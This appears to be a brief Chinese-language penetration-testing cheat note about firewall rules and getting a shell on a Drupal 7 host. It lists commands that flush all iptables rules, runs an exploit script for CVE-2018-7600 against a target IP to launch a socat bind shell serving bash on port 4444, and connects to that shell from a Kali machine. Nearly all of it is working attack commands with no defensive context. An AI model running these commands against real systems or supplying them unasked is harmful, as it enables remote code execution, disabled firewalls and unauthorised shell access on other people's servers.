# 防火墙规则以及放行

```bash
sudo /sbin/iptables -L        --查看规则
sudo /sbin/iptables --flush    --全部放行
```

1. 绕过防火墙（存在问题）

```bash
python cve-2018-7600-drupal7.py -t 192.168.2.177 -c "which socat" -p 8000
python cve-2018-7600-drupal7.py -t 192.168.2.177 -c "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane" -p 8000

kali执行
socat FILE:`tty`,raw,echo=0 TCP:192.168.247.166:4444
```
